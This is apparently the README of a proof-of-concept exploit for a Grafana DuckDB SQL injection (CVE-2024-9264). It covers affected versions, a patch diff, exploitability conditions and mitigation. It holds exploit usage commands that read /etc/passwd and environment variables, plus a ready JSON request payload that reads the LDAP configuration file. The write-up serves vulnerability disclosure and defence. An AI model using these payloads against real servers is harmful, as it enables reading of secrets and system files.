# CVE-2024-9264  
## Grafana Post-Auth DuckDB SQL Injection (File Read)

### Proof of Concept (PoC)

This PoC demonstrates the exploitation of the vulnerability using an authenticated user to perform a DuckDB SQL query and read an arbitrary file on the filesystem.

**Setup:**
Install the required dependencies via:
```bash
pip install -r requirements.txt
```

**Usage (File Read Example):**
```bash
python3 CVE-2024-9264.py -u user -p user  -f /etc/passwd  http://localhost:3000
```

You can also execute arbitrary DuckDB queries, such as calling `getenv` to retrieve environment variables:
```bash
python3 CVE-2024-9264.py -u user -p user -q "SELECT getenv('PATH')" http://localhost:3000
```

The list of utility DuckDB functions that can be exploited can be found [here](https://duckdb.org/docs/sql/functions/utility).

### Vulnerability Overview

[CVE-2024-9264](https://grafana.com/security/security-advisories/cve-2024-9264) is a DuckDB SQL injection vulnerability in Grafana's experimental SQL Expressions feature. Any authenticated user can execute arbitrary DuckDB SQL queries through modified expressions in Grafana dashboards.

**Affected Versions:**
- Grafana OSS and Enterprise versions 11.0.0 - 11.0.5, 11.1.0 - 11.1.6, and 11.2.0 - 11.2.1.

**Patched Versions:**
- 11.0.5+security-01 and higher

### Finding the Patch

Grafana released special versions to fix this vulnerability. To analyze the patch, the following commands can be used to compare the changes:

```bash
git checkout v11.0.5+security-01
git diff 0421a8911cfc05a46c516fd9d033a51e52e51afe 70316b3e1418c9054017047e63c1c96abb26f495
```

This reveals that the SQL Expressions feature was simply removed from the vulnerable versions.

```diff
+++ b/pkg/expr/sql/db.go
@@ -0,0 +1,26 @@
+package sql
+
+import (
+       "errors"
+
+       "github.com/grafana/grafana-plugin-sdk-go/data"
+)
+
+type DB struct {
+}
+
+func (db *DB) TablesList(rawSQL string) ([]string, error) {
+       return nil, errors.New("not implemented")
+}
+
+func (db *DB) RunCommands(commands []string) (string, error) {
+       return "", errors.New("not implemented")
+}
+
+func (db *DB) QueryFramesInto(name string, query string, frames []*data.Frame, f *data.Frame) error {
+       return errors.New("not implemented")
+}
+
+func NewInMemoryDB() *DB {
+       return &DB{}
+}
```

```diff
@@ -85,7 +84,7 @@ func (gr *SQLCommand) Execute(ctx context.Context, now time.Time, vars mathexp.V
 
        rsp := mathexp.Results{}
 
-       duckDB := duck.NewInMemoryDB()
+       duckDB := sql.NewInMemoryDB()
        var frame = &data.Frame{}
        err := duckDB.QueryFramesInto(gr.refID, gr.query, allFrames, frame);
        if err != nil {
```

The patch removes SQL Expressions entirely, preventing the possibility of exploitation.

### Exploiting the Vulnerability

1. **Launch Grafana**:
   Run Grafana with version 11.0.5:
   ```bash
   docker run --name=grafana -p 3000:3000 grafana/grafana-enterprise:11.0.5
   ```

2. **Modify an Expression**:
   Create a dashboard with an expression like "Math", intercept the request with Burp, and modify the `datasource` type from `math` to `sql`.

   Below is the minimal JSON required to perform a DuckDB SQL query to read an arbitrary file like `./conf/ldap.toml`:
   
   ```json
   {
     "queries": [
       {
         "refId": "B",
         "datasource": {
           "type": "__expr__",
           "uid": "__expr__",
           "name": "Expression"
         },
         "type": "sql",
         "hide": false,
         "expression": "SELECT content FROM read_blob(\"./conf/ldap.toml\")",
         "window": ""
       }
     ],
     "from": "1729313027261",
     "to": "1729334627261"
   }
   ```


### Likelihood of Exploitability

It's important to note that while this vulnerability is critical, its exploitability depends on whether the DuckDB binary is installed on the Grafana server. **By default, Grafana does not ship with DuckDB installed**, and there is no option to install it directly from the Grafana interface. 

**For this vulnerability to be exploitable, an administrator must have manually installed DuckDB and added it to the Grafana server's `$PATH`.** If DuckDB is not present, the SQL injection vulnerability cannot be leveraged, significantly reducing the likelihood of successful exploitation in default installations.

### Mitigation

Update Grafana to patched versions, and ensure that the DuckDB binary is not present in the `$PATH` if patching is delayed.

### Credits

This PoC uses the [ten](https://github.com/cfreal/ten) framework developed by [cfreal](https://github.com/cfreal).
